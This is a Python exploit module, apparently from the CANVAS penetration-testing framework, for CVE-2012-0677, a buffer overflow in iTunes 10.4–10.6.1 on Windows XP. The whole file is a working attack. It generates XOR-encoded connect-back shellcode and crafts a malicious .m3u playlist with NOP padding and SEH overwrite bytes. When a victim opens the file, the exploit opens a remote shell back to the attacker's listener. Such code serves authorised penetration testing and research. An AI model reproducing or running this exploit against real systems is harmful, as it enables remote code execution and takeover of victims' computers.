#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import canvasengine

from exploitutils import *
from tcpexploit import *
from canvasexploit import *

from MOSDEF import mosdef
from httpclientside import httpclientside

NAME                              = 'Itunes 10.4 to 10.6.1 Buffer Overflow'
DESCRIPTION                       = 'Itunes 10.4 to 10.6.1 Buffer Overflow SEH based'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = "Apple"
DOCUMENTATION['Date public']      = ''
DOCUMENTATION['References']       = ''
DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION['VersionsAffected'] = 'Itunes 10.4 to 10.6.1'
DOCUMENTATION['CVE Name']         = 'CVE-2012-0677'
DOCUMENTATION['CVE Url']          = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0677'
DOCUMENTATION['CVSS']             = 0

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['XP']

DOCUMENTATION['Notes']            = """
Buffer overflow SEH based for Itunes 10.4 to 10.6.1 on Windows XP SP2
"""

CHANGELOG                         = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.version       = 0
        self.name          = NAME
        self.filename      = 'list.m3u'
        self.badstring     = '\x00' + '\x0a' + '\x0d' + '\x01'
        self.subesp        = 0
        self.name          = NAME
        self.callback_ip   = None
        self.callback_port = 5555


    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def makefile(self):
        sc = shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp', {'subespval': 0})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect', {'port'      : self.callback_port,
                                  'ipaddress' : self.callback_ip})

        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id   = self.engine.getNewMosdefID(self)

        sc.addAttr("send_universal", {"mosdef_type": mosdef_type,
                                      "mosdef_id": mosdef_id})

        sc.addAttr("RecvExecDepSafe", {'socketreg': 'FDSPOT'})
        sc.addAttr("ExitThread",None)
        sc.vAllocSelf = True #we need to move to another page!
        rawshellcode = sc.get()

        import xorencoder
        enc = xorencoder.simpleXOR()
        enc.setbadstring(self.badstring)
        ret = enc.find_key(rawshellcode)

        if ret == 0:
            self.log("Could not generate key for this shellcode!")
            raise Exception, "No shellcode generated"

        self.shellcode = enc.encode(rawshellcode)

        crash = '#EXTINF:,'
        padding = "\x90" * 12

        """
        Itunes modifies my shellcode on position 244 adding 1 to the byte.
        For this reason i substract 1 to the byte on the position 244 of shellcode.
        Also for this same reason \x01 is also added to self.badstring for avoid \x00 in the middle of shellcode.
        """

        self.shellcode = self.shellcode[:244] + chr(ord(self.shellcode[244]) - 1) + self.shellcode[245:]
        morepadding    = "\x90" * (751 - (len(self.shellcode[252:])))
        morepadding   += "\xe9\x10\xFC\xFF\xFF" # jmp far
        nextSEH        = "\xeb\xF9\x90\x90" # jmp short
        seh            = "\x0b\x0b\x28\x00" # call [ebp+30]
        buf            = crash + padding + self.shellcode + morepadding + nextSEH + seh

        return buf

    def getArgs(self):
        self.getarg("filename")
        self.getarg("callback_ip")
        self.getarg("callback_port")


    def run(self):
        self.getArgs()

        if not self.filename:
            self.log('No filename given, aborting..')
            return 0

        if not self.callback_ip:
            self.log('No callback IP given, aborting..')
            return 0

        if not self.callback_port:
            self.log('No callback port given, aborting..')
            return 0

        try:
            evil_data = self.makefile()
        except Exception:
            return 0

        self.log('Opening %s for output' % (self.filename))

        try:
            with open(self.filename, 'wb') as f:
                f.write(evil_data)
                self.log('Wrote to %s' % (self.filename))
        except Exception, ex:
            self.log('Error: %s' % ex)
            return 0

        self.log('Do not forget to start a listener at %s:%s' % (self.callback_ip, self.callback_port))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

